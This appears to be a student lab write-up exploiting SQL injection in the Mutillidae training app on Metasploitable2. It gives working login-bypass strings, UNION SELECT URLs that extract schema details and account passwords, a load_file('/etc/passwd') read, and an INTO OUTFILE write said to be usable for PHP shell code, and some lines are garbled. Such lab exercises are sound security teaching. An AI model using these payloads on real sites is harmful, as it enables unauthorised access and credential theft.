# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database.

Identify IP address using ifconfig in Metasploitable2
![379091061-7b903362-b443-443d-b3da-95292c0dcfa4](https://github.com/user-attachments/assets/668a5952-1592-4f27-bfc8-a21f45b4ac36)
Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![379091156-aa1f61a1-9d4a-4adb-82c3-1bfff8df1194](https://github.com/user-attachments/assets/e6731744-8d80-435b-ab5d-26bcb30eb382)
Select Multidae from the menu listed as shown above. You will get the page as displayed below:
![379091244-97879799-ce93-4b55-baaf-b7264d7c5e09](https://github.com/user-attachments/assets/79abce7f-ec3a-42f8-bed7-bd74e64c401a)
Click on the menu Login/Register and register for an account
![379091326-e5227127-f04d-4f80-9377-e6e5c861a023](https://github.com/user-attachments/assets/7558189b-d2b0-44d3-b2c3-53a78536d74c)
Click on the link “Please register here”
![379091429-39594ea4-1a5f-4937-8f30-fba66bd767cd](https://github.com/user-attachments/assets/cc12ff67-2f68-4a65-b269-389c48f2a838)
![379091527-8f259f47-433e-4a21-8551-5e15a869c871](https://github.com/user-attachments/assets/456a80bc-d4bd-4228-a799-584c4adf13a0)
Click on “Create Account” to display the following page:
![379091599-5d3c9089-1a86-4c3f-a2bf-ce4cba989367](https://github.com/user-attachments/assets/3e47ef77-fe32-4e79-a6f6-525859f0460a)
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
![379091717-2f2cf8ea-c6dc-4bb0-88f0-0fd4ce3a4fad](https://github.com/user-attachments/assets/20f10383-69ac-443f-9609-472fd6e90ea0)
Click “Login”. The logged in page will show as below:
![379091850-ecc92b4a-182a-47fe-be8f-865a3eccd5f8](https://github.com/user-attachments/assets/853ff583-bdd5-44e0-861d-707f60827fdc)
# BYPASSING LOGIN FILED
The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
![379092031-82f9f3be-6cb1-4823-8280-c3af385c3f6c](https://github.com/user-attachments/assets/837e65b1-ddcd-47c3-81bf-44cbe6f00780)
Click the login button and you will see it enter into the administrator page.
![379092128-1066ff4b-7890-4007-9e93-cd0afd23d500](https://github.com/user-attachments/assets/dd8ad339-568a-4f88-a032-9d6ac148c6f3)
# Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below:
![379092233-c115b9da-0008-486c-80dc-4dd3e9ad5b93](https://github.com/user-attachments/assets/845eb3a1-3343-4446-97c8-a74d1b771dec)
![379092288-38c19448-39c3-46fb-92c8-20e36b82c683](https://github.com/user-attachments/assets/55266215-8f7b-4e4b-ad69-bda244aa4c30)
![379092336-7a768446-64d7-4a80-b96b-89c397e24aff](https://github.com/user-attachments/assets/de5f688d-4627-45ce-b691-621a0df09880)
![379092385-93312337-bc95-42be-90bc-dfc11ecc5101](https://github.com/user-attachments/assets/32fa8e54-e21d-43e0-b50a-134c99e532e8)
![379092438-4e6a2477-b821-487d-b1e7-a24f950ae8ec](https://github.com/user-attachments/assets/45601da8-5a73-4548-822c-9d604f10857e)
From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![379092557-559142aa-b5a3-473e-8b6f-ed96fa179ad0](https://github.com/user-attachments/assets/d98f1bc0-7577-4f8f-a165-06f0e295eac2)
Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
![379092640-9652a949-19ac-4cb9-9698-733bbccd3093](https://github.com/user-attachments/assets/a358a26e-5815-4d24-92bb-dc021b6dcc25)
After adding the order by 6 into the existing url , the following error statement will be obtained:
![379092744-ab58f46d-3369-4ccb-a3ac-4d8031dec192](https://github.com/user-attachments/assets/17e7205b-76de-4680-a41a-697e65d3625e)
When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![379092809-05ec7591-ab49-47da-a766-b8eb4c9fc9b5](https://github.com/user-attachments/assets/f74de3ae-d710-4da4-9976-0dc959d199c8)
As it is having 5 columns the query worked fine and it provides the correct result
![379092875-b065cff4-9ca9-4d25-a995-250c2a114333](https://github.com/user-attachments/assets/50afb107-eb25-4b41-9f58-4faae07a1c63)
Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union
![379092960-58b074e6-64cb-49f0-afd0-4403273e742b](https://github.com/user-attachments/assets/d109415e-6522-4ab2-b2a9-63c914d67958)
As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![379093060-3ada5ff8-451a-47d1-918c-3f050412a589](https://github.com/user-attachments/assets/8b7ba127-078c-43ab-9d07-af4c9beaffaf)
Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
![379093295-28bb9041-6729-418f-ae5b-442565461341](https://github.com/user-attachments/assets/12863bd5-b162-48b8-b5e8-ec24d0c087cd)
The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![379093383-a20508d4-9161-4857-afe9-9b91df6c37b1](https://github.com/user-attachments/assets/345c7316-fcea-498a-9c0d-5f152d81a7c4)
The url once executed will retrieve table names from the “owasp 10” database.
# Extracting sensitive data such as passwords
When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![379093493-882f154d-a231-4e78-a335-e85266f127f8](https://github.com/user-attachments/assets/80b53097-83be-4810-bede-430507f64066)
![379093535-143f6b94-3596-4745-9b44-bdb21834479b](https://github.com/user-attachments/assets/1c5b4fd6-19f9-46e9-b97b-283e45007f12)
The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![379093615-a674c2a2-6f98-4366-816c-136f8253813e](https://github.com/user-attachments/assets/d75d6895-ff2d-49a6-86d1-a47a1583d3a1)
Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.
# Ex: (union select 1,username,password,is_admin,5 from accounts).
http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![379093741-07a66e96-cfe9-4f5c-af59-a7421dab323d](https://github.com/user-attachments/assets/a9fd17f4-924d-483c-8b90-b8bddac079bc)
Reading and writing files on the web-server We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

# Ex: (union selectnull,load_file(‘/etc/passwd’),null,null,null).
http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![379093817-d2729d6f-16d5-43a9-af96-3dd70a2f29f5](https://github.com/user-attachments/assets/d0e5ce0c-ee0b-4e94-a912-b0a8080598d1)
the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).
## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
